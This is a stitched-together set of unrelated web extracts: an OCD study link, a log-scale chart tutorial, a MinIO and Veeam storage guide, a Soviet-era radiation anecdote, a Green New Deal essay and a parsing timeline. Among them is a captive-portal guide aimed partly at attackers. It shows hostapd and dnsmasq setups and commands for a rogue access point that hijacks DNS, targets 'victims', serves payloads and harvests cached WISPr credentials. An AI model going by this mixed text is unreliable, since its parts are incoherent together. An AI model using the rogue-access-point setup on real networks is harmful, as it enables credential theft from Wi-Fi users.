href="https://t.umblr.com/redirect?z=https%3A%2F%2Flabblog.uofmhealth.org%2Fbody-work%2Fwhich-ocd-treatment-works-best-new-brain-study-could-lead-to-more-personalized-choices&amp;t=MWI4OWY1NTc2OTI2NWQ4NTQ2NjlkZDU3MmI2MWM4OTVjYTAyNjI5MCxnOWo3RE1BWQ%3D%3D&amp;b=t%3AeWj9QNbkB8x7_Y2XTyPu8A&amp;p=https%3A%2F%2Fnuadox.com%2Fpost%2F627900402450497536%2Fpersonalized-ocd-treatment&amp;m=0&amp;ts=1599049769">University of Michigan</a></b></p><p><b>Full study:</b>&nbsp;“Treatment-Specific Associations Between Brain Activation and Symptom Reduction in OCD Following CBT: A Randomized fMRI Trial”,&nbsp;<i>American Journal of Psychiatry</i>.</p><p><a href="https://t.umblr.com/redirect?z=https%3A%2F%2Fdoi.org%2F10.1176%2Fappi.ajp.2020.19080886&amp;t=OTE5MWMwYmQzMjFjMzJkZThjM2I3NjcxMGQwMjFkNTcyM2YyNjM0NCxnOWo3RE1BWQ%3D%3D&amp;b=t%3AeWj9QNbkB8x7_Y2XTyPu8A&amp;p=https%3A%2F%2Fnuadox.com%2Fpost%2F627900402450497536%2Fpersonalized-ocd-treatment&amp;m=0&amp;ts=1599049769">https://doi.org/10.1176/appi.ajp.2020.19080886</a><br></p><h2><b>Read Also</b></h2><p><a href="https://nuadox.com/post/180354004837/smartphone-app-for-ocd">Simple smartphone app that could help OCD sufferers</a></p>

<br/><!-- hnss:readable-content --><hr/><div id="readability-page-1" class="page"><div itemprop="articleBody">
            <p><em>This is part 1 of a series by the data visualization tool <a href="https://www.datawrapper.de/" target="_blank" rel="noopener">Datawrapper</a> that explains log scales. Visit <a href="https://blog.datawrapper.de/weeklychart-logscale2/">part 2</a> or <a href="https://blog.datawrapper.de/weeklychart-logscale3/">part 3</a>.</em></p>
<p>As promised <a href="https://blog.datawrapper.de/weeklychart-scatterplotlinechart">last week</a>, we have a closer look at the logarithmic scale this week. I won’t get into mathematical details to explain what a logarithm is – I won’t even explain when we should use log scales instead of linear scales. This and next week, I’ll explain what log scales can tell us.</p>
<p>We start slowly. Here’s a chart that’s not on a log scale –&nbsp;not yet:</p>
<hr>

<p>We will transform it to a chart with a log scale in a minute (in <a href="https://www.datawrapper.de/" target="_blank" rel="noopener">Datawrapper</a>, it’s as easy as clicking on a checkbox). First, let’s learn some basics about log scales, to understand what they tell us:</p>
<h3 id="Log-scales-show-relative-values">Log scales show relative values</h3>
<p><strong>Log scales show relative values instead of absolute ones.</strong> Log scales don’t care that 101 minus 100 equals the same as 2 minus 1. Instead, they are concerned with percentages: the difference between 100 and 101 is a 1% increase, while the difference between 1 and 2 is a 100% increase. So on a log scale, the distance between 100 and 101 is roughly 1% of the distance between 1 and 2:</p>
<p><img alt="" data-src="/img/full-180531_log6.png" data-src-thumb="/img/thumb-180531_log6.png" src="https://blog.datawrapper.de/img/thumb-180531_log6.png"></p>
<h3 id="The-same-distance-on-a-log-scale-shows-the-same-rate">The same distance on a log scale shows the same rate</h3>
<p>So what do same distances on a log scale show? They show the same percentage growth or decline. Imagine you eat candy for money and your business grows yearly by 100%. That means every year you eat twice as many candies than you ate the previous year.</p>
<p>In year zero, you start by eating <strong>1</strong> candy.</p>
<p>In the 1st year, you eat <strong>2</strong> candies. The year after that, you eat <strong>4</strong> candies. In the 3rd year, you eat <strong>8</strong> candies. By year 5, you eat <strong>32</strong> candies, and on your 25th anniversary, you would be eating <strong>33.5 million</strong> candies.</p>
<p>On a linear scale, a line chart plotting these numbers would go insanely high very quickly. On a log scale, each of these amounts takes up the same space, because, in each year, the number of candies <strong>grows at a fixed rate (100%)</strong>.</p>
<p><img alt="" data-src="/img/full-180531_log1.png" data-src-thumb="/img/thumb-180531_log1.png" src="https://blog.datawrapper.de/img/thumb-180531_log1.png"></p>
<h3 id="How-to-read-a-log-scaled-chart">How to read a log scaled chart</h3>
<p>Let’s see what that means for our chart. Here, the log scale can show us two things that the linear scale can’t show us: First, the <strong>drop of short-term arrivals in the Second World War</strong>. There wasn’t a stark drop in <em>absolute</em> numbers (that’s why we can’t see it in the chart up there), but it was a stark drop in <em>relative</em> numbers:</p>

<p><strong>How stark?</strong> Well, we know by now that the same unit on a log scale represents the same growth rate. Looking closer, we see that the drop during the Second World War is almost as “deep” as the growth afterward is “high”. In April 1942, only 40 people visited New Zealand. Three years earlier, there were 33 times as many tourists: 1,310 in total. It took ten years to get back to that number of 1,300 tourists (for April) – that’s the brown range in our chart. But the growth didn’t stop there. Within 32 years, the number of tourists in New Zealand grew again by 33 times and reached 45,700 tourists in 1984 – that’s the blue range.</p>
<p>The <strong>blue range has the same height as the brown range because both ranges represent a 33-fold increase</strong>; no matter their absolute values. So during the Second World War, the arrivals in New Zealand dropped almost by the same rate between 1939 and 1942 as they increased between 1952 and 1984. That’s something the log scale can tell us and the linear scale can’t.</p>
<p>The log scale also shows us something about the arrivals each season. We can see that the ups and downs get smaller over time. So we can conclude that <strong>seasonal increase and decrease of arrivals each year happened at a higher rate</strong> before the Second World War than after the Second World War, and at an even lower rate since approximately 1985.</p>

<br/><!-- hnss:readable-content --><hr/><div id="readability-page-1" class="page"><p>This is the most comprehensive guide to Captive Portal on the planet.</p><p>I’m going to show you how you can build your own Captive Portal Software for Hacking, Business Security, and Growth.</p><p>In short: if you want to leverage WiFi Captive Portals for improving your Business, you’ll love this guide.</p><p>Let’s get started.</p><p><note>Sharpen your Network Security skills with <b>rootsh3ll Labs</b>, right from your browser. Click to <a href="https://labs.rootsh3ll.com/?ref=" captive-portal-guide"="">start you first lab</a></note></p><p>Operating in an Enterprise, studying in a college or sitting in Starbucks, you must have encountered a login screen like this once.</p><p>You connect to the WiFi network and it greets with you a similar login screen. That page is called a captive portal.</p><p>But, what is a captive portal exactly, How does it work and how the system knows where the captive portal is?</p><p>These are all the questions you are going to uncover from this guide and take-away the knowledge to build your own captive portal for your company, institute etc and use it for fun and profit.</p><p>Technically speaking, an authentication screen is displayed when a wireless user is not authorized to access the network resources. The authentication page is called a captive portal login.</p><p>1. DNS Redirection<br>
2. Splash page</p><p>DNS redirection works as the simple DNS hijacking where all the user DNS requests are hijacked and resolved to the captive portal login page. But, after widespread use of HSTS header implementation, DNS redirection hits a low success ratio providing no better service to the users.</p><p>Whereas, a Splash Page works in a little different fashion. It also uses DNS redirections but, it responds to the requests acc. to the operating systems which trick the O.S in believing there is a captive portal login in place and forcing the O.S to automatically trigger the login page to the user.</p><p>When a client device is connected to the WiFi, If unauthorized to access the Internet, A screen automatically pops up to display the captive portal.</p><p>A Splash page not only bypasses HSTS implementations on most websites but also gives you the flexibility of showing O.S specific login pages.</p><div>

<p>The only difference in regular captive portal and splash page is that splash page pulls up the captive portal login page automatically. Whereas, the DNS redirection based method requires a user to manually open up a website.</p>
<p>Imagine if a user is using a mobile app only, how would a user know he needs to log in? If you are a hacker you will lose your victim because the device will automatically disconnect upon no Internet access. So, this leads us to the much better and flexible option for triggering captive portal login page, the Splash Screen.</p>
<p>As a business operator, you can show a different kind of services to different client devices, whereas as an attacker you can identify victim machine automatically and serve the payload accordingly. I’ll showcase its crux, and leave implementation upon your creativity and requirement.</p>

<h2>Different Client Behaviours</h2>
<p>Now comes the technical theory part of this guide. It is important for you to understand the theory behind a captive portal before diving into the practical aspect of it.<br>
<a href="#start-ap">Click here</a> to skip the theory and jump into action</p>
<h3>Basic Strategy behind portal detection</h3>
<p>Every operating system has its own different way of detecting Internet access.</p>
<p>The mechanism is this basically:</p>
<pre>GET/POST http://foo.com/bar.html
If bar.html == [expected content] &gt; Open Internet
If bar.html != [expected content] &gt; Captive Portal
If bar.html[status] != SUCCESS &gt; No Network
</pre>

<p>If a Captive Portal is not in place, the result will match the expected one and the OS will know that there is full access to the Internet.</p>
<p>If the URL returns a result other than the expected one, then the OS will detect that there is a Captive Portal in place and that it’s needed to proceed with authentication in order to get full access to the Internet: In this case, the OS will open the Splash Page automatically.</p>
<p>All client devices use the above-described strategy to find out if they are behind a captive portal, but the URL might vary depending on the specific model of smartphone, tablet, laptop and depending on the specific OS version. In the following, you can find the list of domains that are contacted by each model in order to detect the captive portal.</p>
<h3>Captive Portal Detection method by various Operating Systems</h3>
<h4>Android 4 – 9</h4>
<p>Android devices look for an HTTP 204 response for a file named generate_204 from the following domain.</p>
<pre><code>clients3.google.com
connectivitycheck.android.com
connectivitycheck.gstatic.com</code></pre>
<p>HTTP Status 204 means the file exists but, is empty. This lets Android know that the Internet is accessible. If the request receives HTTP Status 302 (temporary redirect) instead of HTTP 204, Android will follow the redirection URL to display the Captive Portal to the user.</p>
<p>In its nature, all the domains serve on HTTP and not HTTPS which makes the captive portal mechanism possible. Also, it allows an attacker to use the redirection to bypass security.</p>
<p>Unlike Apple Devices, Android is very fragmented acc. to the install base. Which leaves us with a wide variety of attack surface as an attacker. Have a look at the current install base of Android devices acc. to Google.</p>

<h4>Windows</h4>

<p>Windows uses hardcoded IPv4 and ipv6 addresses to match the request response to verify the Internet connection. Though it can be spoofed for availability pretty easily.</p>

<div>
<h2>Apple’s secret “WISPr” request</h2>
<p>WISPr (pronounced “whisper”) or Wireless Internet Service Provider roaming used by every Apple device for captive portal detection. This technology allows users to roam between wireless internet service providers in a fashion similar to that which allows cell phone users to roam between carriers.</p>
<p>Another question is whether this is an attack vector. The answer is “probably yes”. There is more to the functionality than a simple HTTP request. If you look up the keyword “wispr” from the User-Agent string in apache logs, you’ll find out why.</p>
<p>The idea is that smart Wi-Fi portals will detect that this is a WISPr-supporting device, and send back a WISPr message in XML. This allows the iDevice(s) to then log in with cached credentials via another XML message. This means, for example, you might be able to grab somebody’s credentials with a properly configured Wi-Fi access-point.</p>
<p>When an iDevice connects to a Wi-Fi network, the first thing it does is make a request to the URL captive.apple.com or apple.com/test/success.html.</p>
<p>With iOS 7 onwards, Apple began to use the User Agent “<strong>CaptiveNetworkSupport</strong>“, though it’s not as common as the URL method that Android and Windows uses.</p>
<p>The reason Apple does this is that you may be using an app other than the web browser. For example, the only thing you might be doing is syncing your e-mail. In such situations, no auto-redirection would work as no browser is in use and you would never see the portal page, and your app will mysteriously fail to connect to the Internet.</p>
<p>Therefore, before your app has a chance to access the network, Apple does this for you. It sends out a request to the above URL. If the request gets redirected, then Apple knows there is a portal. It then launches a dialog box, containing Safari, to give you a chance to log in.</p>
<p>When reading apache logs (<b>/var/logs/apache2/access.log</b>) for apple devices, you’ll see something like this:</p>
<pre>10.0.0.194 - - [03/March/2019:14:14:22 +0530] "GET /hotspot-detect.html HTTP/1.0" 302 487 "-" "<strong>CaptiveNetworkSupport-346.50.1 wispr</strong>"
10.0.0.194 - - [03/March/2019:14:14:22 +0530] "GET / HTTP/1.0" 200 2004 "-" "<strong>CaptiveNetworkSupport-346.50.1 wispr</strong>"</pre>
</div>
<h2 id="start-ap">Access Point Configuration</h2>
<h3>Installation</h3>
<pre><code>







<ul>








 	<li pf="$">sudo apt update</li>
















 	<li pf="$">sudo apt install hostapd dnsmasq apache2 -y</li>








</ul>







</code></pre>
<h4>Configure hostapd</h4>
<p>Create a directory for saved configuration files. Open Terminal and create a hostapd config file.</p>
<pre><code>







<ul>







 	<li pf="$">vi hostapd.conf</li>







</ul>







</code></pre>
<p><file>hostapd.conf</file></p>
<pre>interface=<span>wlan0</span>       # Desired Interface name
driver=nl80211
ssid=<span>Captive Portal</span>   # Desired AP name
hw_mode=g
channel=<span>6</span>
macaddr_acl=0
auth_algs=1
ignore_broadcast_ssid=0
</pre>
<p>Make sure you edit the changes accordingly every time you perform an attack.</p>
<p>Operating Channel number can cause issues if not chosen properly.</p>
<h4>Configure dnsmasq</h4>
<pre><code>







<ul>







 	<li pf="$">vi dnsmasq.conf</li>







</ul>







</code></pre>
<p><file>dnsmasq.conf</file></p>
<pre>interface=<span>wlan0</span>   # Desired Interface name
dhcp-range=10.0.0.10,10.0.0.250,255.255.255.0,12h
dhcp-option=3,10.0.0.1
dhcp-option=6,10.0.0.1
server=8.8.8.8
log-queries
listen-address=127.0.0.1</pre>
<p>Make sure to define proper interface in dnsmasq.conf file.</p>
<h4>Parameter Breakdown:</h4>
<pre><strong>dhcp-range=10.0.0.10,10.0.0.250,12h</strong>:  Client IP address will range from 10.0.0.10 to 10.0.0.250 and default lease time is 12 hours.
<strong>dhcp-option=3,10.0.0.1</strong>:  3 is code for Default Gateway followed by IP of D.G i.e. 10.0.0.1
<strong>dhcp-option=6,10.0.0.1</strong>:  6 for DNS Server followed by IP address</pre>
<p>Kill network-manager utility before running hostapd. Because when you start hostapd, network-manager tries to take control of the wireless device and put it into managed mode. whereas hostapd needs the card to be set to Master mode (Access Point mode). So, kill network-manager and other interfering processes before you begin</p>
<pre><code>







<ul>








 	<li pf="$">sudo killall network-manager wpa_supplicant dnsmasq</li>
















 	<li pf="$">sudo hostapd hostapd.conf</li>








</ul>







</code></pre>
<p>To allocate IP addresses to victims, run dnsmasq.<br>
Before that, set IP address for wlan0 interface to enable IP networking, so that dnsmasq can process the incoming requests and direct the traffic accordingly.</p>
<p>Open a new Terminal for dnsmasq:</p>
<pre>ifconfig wlan0 10.0.0.1       # Set class-A IP address to wlan0
dnsmasq -C dnsmasq.conf -d    # -C: configuration file. -d: daemon (as a process) mode
</pre>
<p>as soon as victim connects you should see similar output for hostapd and dnsmasq Terminal windows:</p>
<p><file>[ <strong>hostapd</strong> ]</file></p>
<pre>Using interface wlan0 with hwaddr 00:c0:ca:5a:34:b7 and ssid "rootsh3ll"
wlan0: interface state …</pre></div></div>

This is wonderful news for us to test this functionality in our labs, or in case we are using Linux storage with MinIO for production.</p><p>In this blog entry, we’re going to jump into the pool and see: how to install and configure MinIO with Erasure Coding Enabled, Immutability, Let’s Encrypt, and finally, we’ll see how to configure it in Veeam. As it has gone out of my hands, I leave you with a menu to move faster:</p><ol><li><a href="#requerimientos"><strong>MinIO System Requirements</strong></a><ol><li><a href="#que"><strong>What is MinIO Erasure Coding?</strong></a></li><li><a href="#util"><strong>Why use MinIO Erasure Coding?</strong></a></li><li><a href="#configuracion"><strong>Disk Configuration to use MinIO Erasure Coding</strong></a></li></ol></li><li><a href="#desplegar"><strong>How-to Deploy, and Configure MinIO, including object Immutability, and Let’s Encrypt</strong></a><ol><li><a href="#confminio"><strong>How-to configure&nbsp; Let’s Encrypt for MinIO</strong></a></li><li><a href="#arrancar"><strong>Run MinIO with Erasure Coding</strong></a></li><li><a href="#crear"><strong>Creating a new Bucket in MinIO with the Immutability attribute</strong></a></li></ol></li><li><strong><a href="#veeam">Veeam Backup &amp; Replication Configuration with Immutable Storage</a> </strong><ol><li><a href="#repo"><strong>Backup Repository Creation – Object Storage</strong></a></li><li><a href="#sobr"><strong>Scale-out Backup Repository Creation – with MinIO Immutable as Capacity Tier</strong></a></li><li><a href="#backupcopy"><strong>Backup Copy Job creation, pointing to this new SOBR with Immutability</strong></a></li><li><a href="#eliminar"><strong>Trying to delete Backups from an Object Storage with Immutability Enabled</strong></a></li></ol></li></ol><h2><a name="requerimientos"></a> MinIO System Requirements</h2><p>In this guide, we are not going to try to deploy MinIO in production, as it usually requires about 96GB of RAM, certain cores, etc. In my case I am deploying everything in 4vCPU and 16GB of RAM since I will have only one VBR sending backups, so nothing serious.</p><p>One of the most important things to be able to run Immutability in MinIO, and that it is supported by Veeam, is that we need the MinIO RELEASE.2020-07-12T19-14-17Z version or higher, and also we need the MinIO server to be running with Erasure Coding.</p><h3><a name="que"></a>What is MinIO Erasure Coding?</h3><p>MinIO Erasure Coding is a mathematical algorithm to reconstruct lost or corrupted data. MinIO uses Reed-Solomon code to fragment objects into variable data and parity blocks. For example, in a 12-unit configuration, an object can be split into a variable number of data and parity blocks in all units – from six data and six parity blocks to ten data and two parity blocks.</p><p>By default, MinIO divides objects into N/2 data and parity units. However, you can use storage classes to use a custom configuration. We recommend the N/2 data and parity blocks, as this ensures the best protection against drive failure.</p><p>In the 12-drive example above, with the MinIO server running at the default settings, you can lose any of the six drives and still reliably rebuild data from the remaining drives.</p><h3><a name="util"></a>Why use MinIO Erasure Coding?</h3><p>MinIO Erasure Coding protects data from multiple drive failures, unlike RAID or replication. For example, RAID6 can protect against the failure of two drives, while MinIO Erasure Coding can lose up to half of the drives and still keep the data safe. In addition, MinIO Erasure Coding is at the object level and can recover one object at a time. In the case of RAID, recovery can only be done at the volume level, resulting in high downtime. Since MinIO encodes each object individually, it can cure objects incrementally. Storage servers, once deployed, should not require disk replacement or healing for the life of the server. MinIO’s Erasure Coding backend is designed for operational efficiency and takes full advantage of hardware acceleration whenever available.<a

                    <!--kg-card-begin: markdown--><!--kg-card-begin: markdown--><p>Sergei is a veteran of the early days of the computing industry as it was developing in the Soviet Union. I had the pleasure of working and learning from him over the past year, and in that time I picked up more important lessons about both life and embedded programming than any amount of school could ever teach. The most striking lesson is the story of how and why, in late summer of 1986, Sergei decided to move his family out of the Soviet Union.</p>
<p>In the 1980s, my mentor Sergei was writing software for an SM-1800, a Soviet clone of the PDP-11.  The microcomputer was just installed at a railroad station near Sverdlovsk, a major shipping center for the U.S.S.R. at the time. The new system was designed to route train cars and cargo to their intended destinations, but there was a nasty bug that was causing random failures and crashes. The crashes would always occur once everyone had gone home for the night, but despite extensive investigation, the computer always performed flawlessly during manual and automatic testing procedures the next day. Usually this indicates a race condition or some other concurrency bug that only manifests itself under certain circumstances. Tired of late night phone calls from the station, Sergei decided to get to the bottom of it, and his first step was to learn exactly which conditions in the rail yard were causing the computer to crash.</p>
<p>He first compiled a history of all occurrences of the unexplained crashes and plotted their dates and times on a calendar. Sure enough, a pattern was clearly visible.  By observing the behavior for several more days, Sergei saw he could easily predict the timing of future system failures.</p>
<p>He soon figured out that the rail yard computer malfunctioned only when the cargo being processed was live cattle coming in from northern Ukraine and western Russia heading to a nearby slaughterhouse. In and of itself this was strange, as the local slaughterhouse had in the past been supplied with livestock from farms located much closer, in Kazakhstan.</p>
<p>As you may know, the Chernobyl Nuclear Power Plant disaster occurred in 1986 and spread deadly levels of radiation which to this day make the nearby area uninhabitable. The radioactivity caused broad contamination in the surrounding areas, including northern Ukraine, Belarus, and western Russia.  Suspicious of possibly high levels of radiation in the incoming train cars, Sergei devised a method to test his theory. Possession of personal Geiger counters was restricted by the Soviet government, so he went drinking with a few military personnel stationed at the rail yard. After a few shots of vodka, he was able to convince a soldier to measure one of the suspected rail cars, and they discovered the radiation levels were orders of magnitude above normal.</p>
<p>Not only were the cattle shipments highly contaminated with radiation, the levels were high enough to randomly flip bits in the memory of the SM-1800, which was located in a building close to the railroad tracks.</p>
<p>There were often significant food shortages in the Soviet Union, and the government plan was to mix the meat from Chernobyl-area cattle with the uncontaminated meat from the rest of the country. This would lower the average radiation levels of the meat without wasting valuable resources. Upon discovering this, Sergei immediately filed immigration papers with any country that would listen. The computer crashes resolved themselves as radiation levels dropped over time.</p>

<br/><!-- hnss:readable-content --><hr/><div id="readability-page-1" class="page"><div><p>Humans have been terrible stewards of the environment. Mining, deforestation, pollution, overuse of freshwater, sprawl, depletion of natural resources—even before the threat of global warming became apparent, the authors of the book <em>The Limits of Growth</em>, almost 50 years ago, tried to warn humanity that the planet’s ecosystems could not survive under the assault of development without a consciously planned restructuring of society. Now both calamities, of ecosystem destruction and climate catastrophe, are feeding each other and accelerating the extinction of species—including, perhaps, humans as well.</p>
<p>We can turn back toward long-term survival, but only if we reconstruct a civilization that mimics nature in one important area that we have only barely initiated—the large-scale recycling and reusing of almost everything we produce. Since no one wants to reuse pollution, if enforced this principle would eliminate air and water pollution as well. Thus, when we manufacture, as explained in the section about manufacturing, the goods produced must be recyclable and reusable, so that we can eliminate most mining, and the attendant ecosystem destruction. One big advantage of replacing all fossil fuels is that the environmental destruction caused by the extraction of oil, coal, and natural gas will also be eliminated. In addition, we can manufacture everything, including chemicals, without pollution, and if we can’t, then we won’t produce it.</p>
<p>Agriculture, instead of mimicking the cycles of ecosystems, has also been set up in such a way that the inputs, like pesticides and artificial fertilizer, cause further environmental havoc, and the outputs, water pollution and unhealthy food, cause problems at the other end. Humans have been warping these natural ecosystems in order to maximize short-term efficiency—but as so often happens in our modern civilization, this short-term productivity leads to long-term collapse. The destruction of soil, which is the very foundation of terrestrial life, is proceeding apace, as is the pollution of water sources. Global warming will make things worse, and indeed the deforestation and destruction of critical ecosystems, including prairies and wetlands, is contributing to global warming in what is called a “positive feedback loop,” one increasing the other, until there will be no way to grow food for billions of people.</p>
<p>Misuse of ecosystems in general, including agriculture and deforestation, contributes about 12.5% and 15% of global greenhouse gas emissions respectively—that is, about 28% in total, and other sources from land misuse, such as methane from landfills, adds another 2.5%, so fully 30% of global greenhouse gas emissions can be attributed directly to destroying ecosystems. The landfill part can be dealt with by recycling and reusing, including for food products which can be used for compost, for example, and thus our program includes a Recycling Corps. For agriculture and deforestation, we need to add other solutions.</p>
<p>Much of deforestation comes about simply to give livestock, particularly cattle, pasture to feed, as in the Amazon, and much of the rest comes from clearing forest to grow crops, such as palm oil in Borneo. As part of the Global Green New Deal, much of this could be stopped by exchanging green machinery from rich countries for preservation of critical ecosystems in poor ones. In addition, reforestation will be a necessary part of a path to making the planet habitable. In the United States, reforestation actually already decreases the United States’ greenhouse gas emissions. A new Civilian Conservation Corps can have as its main objectives two core tasks: to restore ecosystems, and to plant trees. Both will help to decrease emissions and to rebuild ecosystems that are critical to health and well-being.</p>
<p>Restoring ecosystems and planting trees will also help the agricultural sector, which needs trees and healthy ecosystems to provide services like minimizing flooding, cleaning air and water, and providing a place for beneficial organisms like insects and birds to grow. We must move towards an agricultural system that does not use pesticides, which are hazardous, not only to the health of humans, but as we are discovering, also to the existence of critical insect and other populations. These pesticides are getting into everything, even mother’s milk. The federal government needs to spend hundreds of billions to convert the nation’s farms to grow organic food that will be cheaper, better tasting, and healthier than what we have now.</p>
<p>Artificial fertilizer kills the soil, and the runoff ruins river and ocean ecosystems. We need to rebuild the soil in order to draw down carbon as well. Soil should be considered a strategic national resource, like oil is today.</p>
<p>Livestock, if allowed to rotate throughout parts of a well-functioning ecosystem, can benefit agricultural ecosystems. This sustainable livestock must replace the horrible factory-farmed livestock system, which makes the general population ill, partly because of the miserable existence of the livestock. In addition, we need to make fruits, vegetables, and healthy grains much cheaper and more available so that people can easily try alternatives to meat.</p>
<p>Another aspect of a global Green New Deal should be to patrol the world’s oceans and ensure that fishing stocks are allowed to expand to the point where they are sustainable. Currently humans are embarking on the insane venture of wiping out most edible wild fish. A sustainable world will be one where people get much of their protein from well-protected ocean and river sources.</p>
<p>The transformation to organic agriculture will make it more practical for people to choose a diet richer in vegetables and plant-based proteins, including those who are vegetarians and vegans for health, environmental, and ethical reasons.</p>
<p>The transformation of agriculture can even benefit from the expansion of walkable neighborhoods in cities, which can be used to establish networks of urban gardens. In addition, a Green New Deal should encourage the establishment of farm belts around urban regions to encourage local food production.</p>
<p>There is much to be done to prevent ecosystem collapse, and there are many benefits to doing so. A healthy agricultural system leads to healthy people, eating better-tasting food. Restored ecosystems can be left for future generations to enjoy, provided such “ecotourism” takes place in a sustainable and caring way. By restoring forests, wetlands, and soil, we can have a fighting chance of drawing down enough carbon dioxide to avert climate catastrophe. Why should humanity be denied the wonders of forests so a few oligarchs can buy more mansions and yachts?</p>

    <mytitle>Parsing: a timeline</mytitle>
    <version>Version 3.1</version>
    <datestamp>Revision 2, 23 October 2019</datestamp>
    <author>Jeffrey Kegler</author>
    
    <p>In India, Pannini creates an exact and complete description of
      the Sanskrit language, including pronunciation. Sanskrit could be
      recreated using nothing but Pannini's grammar.
      Pannini's grammar is
      probably the first formal system of any kind, predating Euclid.
      In the future, nothing like it will exist for any other natural language of
      significant size or corpus.
      By 2018,
      Pannini will be the object of serious study.
      But in the 1940's and 1950's Pannini will be almost unknown in
      the West.
      This means that Pannini will have no direct effect
      on the other events in this timeline.
    </p>
    
    <p>In her translator's note on an article on Babbage's
    computer, Ada Lovelace becomes the first person to
    clearly distinguish programming a computer (software)
    as a separate field from
    building the computer itself (hardware).<a id="footnote-1-ref" href="#footnote-1">[1]</a>
    Ada is also the first to
    think of software in linguistic terms --
    she originates the idea that,
    in writing software,
    we communicate with the computer,
    and that the means that we use to do that is a "language".<a id="footnote-2-ref" href="#footnote-2">[2]</a>
    </p>
    <blockquote>
     A new, a vast, and a powerful language is developed for the future
     use of analysis, in which to wield its truths so that these may
     become of more speedy and accurate practical application for the
     purposes of mankind than the means hitherto in our possession have
     rendered possible. Thus not only the mental and the material, but
     the theoretical and the practical in the mathematical world, are
     brought into more intimate and effective connexion with each other.<a id="footnote-3-ref" href="#footnote-3">[3]</a>
    </blockquote>
    <p>Here "analysis" means the branch of mathematics that studies limits
    and continuous functions, and which includes calculus.
    </p>
    
    <p>Andrey Markov introduces his
      <term>chains</term>
      -- a set of
      states with transitions between them.<a id="footnote-4-ref" href="#footnote-4">[4]</a>
      One offshoot of Markov's work will be what will
      come to be known as regular expressions.
      Markov uses his chains,
      not for parsing,
      but to deal with a problem in probability --
      does the law of large numbers require that events be
      independent?
      Indirectly, Markov is addressing the question 
      of the existence of free will.<a id="footnote-5-ref" href="#footnote-5">[5]</a>.
    </p>
    
    <p>In 1913, Markov revisits his chains,
      applying them to the sequence of vowels and consonants
      in Pushkin's
      <cite>Eugene Onegin</cite><a id="footnote-6-ref" href="#footnote-6">[6]</a>.
      Again, Markov's interest is not in parsing.
      Nonetheless,
      this is an application to language
      of what later will be regarded
      as a parsing technique,
      and apparently for the first time in the West.
    </p>
    
    <p>Leonard Bloomfield,
      as part of his effort to create a linguistics that
      would be taken seriously as a science,
      publishes his "Postulates".<a id="footnote-7-ref" href="#footnote-7">[7]</a>
      Known as structural linguistics,
      Bloomfield's approach will
      dominate American lingustics for
      over two decades.
    </p>
    
    <p>
      Bloomfield's "Postulates" defines a "language" as
    </p>
    <blockquote>
      [t]he totality of utterances that can be made in a speech
      community<a id="footnote-8-ref" href="#footnote-8">[8]</a>
    </blockquote>
    <p>
      Note that there is no reference in this definition to the usual view --
      that the utterances of a language "mean" something.
    </p>
    <p>
      This omission is not accidental.<a id="footnote-9-ref" href="#footnote-9">[9]</a>
      Bloomfield excludes meaning from his definition of language
      because he wants linguistics to be taken
      seriously as science.
      Behaviorist thought is very influential at this
      time and behavorists believe that,
      while human behaviors can be observed and verified
      and therefore made the subject of science,
      mental states cannot be verified.
      Claiming to know what someone means
      by a word
      is claiming to read his mind.
      And "mind-reading" is not science.
    </p>
    
    <p>Emil Post defines and studies a formal rewriting system<a id="footnote-10-ref" href="#footnote-10">[10]</a>
      using productions.
      With this, the process of rediscovering Pannini in the
      West begins.</p>
    
    <p>Alan Turing discovers the stack as part of his design of the
      ACE machine. This will be important in parsing because recursive parsing
      requires stacks. The importance of Turing's discovery is not noticed
      in 1945 and stacks will be rediscovered many times over the
      next two decades<a id="footnote-11-ref" href="#footnote-11">[11]</a>.
    </p>
    
    <p>Claude Shannon publishes the foundation paper of information theory<a id="footnote-12-ref" href="#footnote-12">[12]</a>.
      In this
      paper, Shannon models English using Andrey Markov's
      chains<a id="footnote-13-ref" href="#footnote-13">[13]</a>.
      The approach is similar to Markov's but the intent
      is different --
      Shannon's is a serious attempt at a contribution
      to parsing human languages.
    </p>
    
    <p>From 1949 to 1951 at the ETH Zurich, Heinz Rutishauser works on
      the design of what we will come to call a compiler<a id="footnote-14-ref" href="#footnote-14">[14]</a>.
      Rutishauser's arithmetic expression parser
      does not honor precedence but it does allow nested parentheses.
      It is perhaps the first algorithm which can really be considered a
      parsing method.
      Rutishauser's compiler is never implemented.</p>
    
    <p>
      In the form of arithmetic expressions, operator expressions
      are the target of the first efforts at automatic parsing.
      We will not see this issue go away.
      Very informally<a id="footnote-15-ref" href="#footnote-15">[15]</a>,
      we can say that
      an operator expression is an expression
      built up from operands
      and operators.
      It is expected that the operand might be another operator expression,
      so operator expressions raise the issue of recursion.
    </p>
    <p>
      The archetypal examples of operator expressions are arithmetic expressions:
    </p><pre><tt>
         2+(3*4)
         13^2^-5*9/11
         1729-42*8675309
      </tt></pre>
    <p>
      In Western mathematics arithmetic expressions have been read
      according to traditional
      ideas of
      associativity and precedence:
    </p><ul>
      <li><tt>^</tt>
        is exponentiation.
        It right associates and has tightest<a id="footnote-16-ref" href="#footnote-16">[16]</a>
        precedence.
      </li>
      <li>
        Multiplication (<tt>*</tt>) and division (<tt>/</tt>) left associate.
        They have a precedence equal to each other
        and less tight than that of exponentiation.
      </li>
      <li>
        Addition ('+') and subtraction ('-') left associate.
        They have a precedence equal to each other
        and less tight than that of multiplication and division.
      </li>
      <li>
        Parentheses, when present, override the traditional
        associativity and precedence.
      </li>
    </ul>
    <p>
      Rutishauser's language
      is structured line-by-line,
      as will be all languages until LISP.
      No language until ALGOL will be truly block-structured.
    </p>
    <p>
      The line-by-line languages
      are parsed using string manipulations.
      A parsing theory is not helpful for describing these
      ad hoc string manipulations,
      so they don't give rise to one.
      The only logic in these early compilers that really deserves to be called
      a parsing method
      is that which tackles arithmetic expressions.
    </p>
    
    <p>During 1950, Corrado Boehm, also at the ETH Zurich,
      develops his own compiler.
      Rutishauser and Boehm are working at the same institution at the same
      time, but Boehm is unaware of Rutishauser's work until his own is
      complete.
      Boehm's is also the first self-compiling compiler -- it is written
      in its own language.
    </p>
    <p>
      Like Rutishauser, Boehm's language is line-by-line and
      parsed ad hoc, except for expressions. Boehm's expression parser
      <em>does</em>
      honor precedence, making it perhaps the first operator precedence
      parser<a id="footnote-17-ref" href="#footnote-17">[17]</a>.
      In Norvell's taxonomy<a id="footnote-18-ref" href="#footnote-18">[18]</a>,
      Boehm's algorithm inaugurates
      the
      <q>classic approach</q>
      to operator parsing.

      Boehm's compiler also allows parentheses, but the two cannot
      be mixed -- an expression can either be parsed using precedence
